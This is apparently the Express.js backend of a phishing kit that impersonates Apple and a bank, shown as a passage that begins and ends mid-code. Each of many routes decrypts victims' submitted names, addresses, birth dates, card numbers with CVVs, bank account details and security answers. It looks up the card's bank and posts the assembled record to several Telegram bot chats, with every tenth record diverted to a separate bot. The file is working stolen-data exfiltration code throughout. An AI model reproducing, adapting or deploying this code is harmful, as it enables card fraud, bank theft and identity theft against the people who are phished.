  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (chasingfunds == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEChasing:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 864072421,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 969827191,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds += 1;
  }
  res.send("Update Complete");
});

//APPLE ES
//APPLE ES
//APPLE ES

app.post("/kelvAppleSpain", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleKelv:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248378980,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }
      res.send("Update Complete");
    });
});

//APPLE AU

app.use("/apple", require("./routes/apple"));

//APPLE GB
//APPLE GB
//APPLE GB

app.post("/appleSYM", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (symEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleSYM:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 750220840,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        symEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/stackerApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pweight == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleStacker:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 715738877,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/pweightApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pweight == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `ApplePweight:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5516677945,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/dpApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (dpFullz == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleDPc:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5582405778,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/rondoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleRondo:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5598032330,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/ghostApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleGhost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5781274308,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/smokedApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
